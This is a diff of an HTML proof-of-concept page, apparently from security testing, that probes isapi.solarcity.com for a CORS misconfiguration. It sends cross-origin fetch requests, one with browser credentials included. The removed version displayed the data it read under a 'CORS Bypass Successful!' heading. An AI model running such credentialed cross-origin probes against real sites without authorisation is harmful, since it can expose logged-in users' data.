@@ -4,23 +4,48 @@
 <title>CORS Test - isapi.solarcity.com</title>
 </head>
 <body>
+<h1>CORS Vulnerability Test</h1>
+<div id="result"></div>
+
 <script>
-// Test if we can read cross-origin content
+// Test 1: Basic CORS request
 fetch('https://isapi.solarcity.com/', {
     method: 'GET',
+    mode: 'cors',
     headers: {
         'Origin': 'null'
-    },
-    credentials: 'include'
+    }
 })
-.then(response => response.text())
+.then(response => {
+    document.getElementById('result').innerHTML += 
+        '<p>Test 1 - Status: ' + response.status + '</p>';
+    return response.text();
+})
 .then(data => {
-    console.log('Successfully read data:', data);
-    document.body.innerHTML = '<h1>CORS Bypass Successful!</h1><pre>' + data + '</pre>';
+    document.getElementById('result').innerHTML += 
+        '<p>Test 1 - Data received: ' + data.length + ' characters</p>';
 })
 .catch(error => {
-    console.log('Error:', error);
-    document.body.innerHTML = '<h1>CORS Blocked</h1><pre>' + error + '</pre>';
+    document.getElementById('result').innerHTML += 
+        '<p>Test 1 - Error: ' + error + '</p>';
+});
+
+// Test 2: With credentials
+fetch('https://isapi.solarcity.com/', {
+    method: 'GET',
+    mode: 'cors',
+    credentials: 'include',
+    headers: {
+        'Origin': 'null'
+    }
+})
+.then(response => {
+    document.getElementById('result').innerHTML += 
+        '<p>Test 2 - Status: ' + response.status + '</p>';
+})
+.catch(error => {
+    document.getElementById('result').innerHTML += 
+        '<p>Test 2 - Error: ' + error + '</p>';
 });
 </script>
 </body>
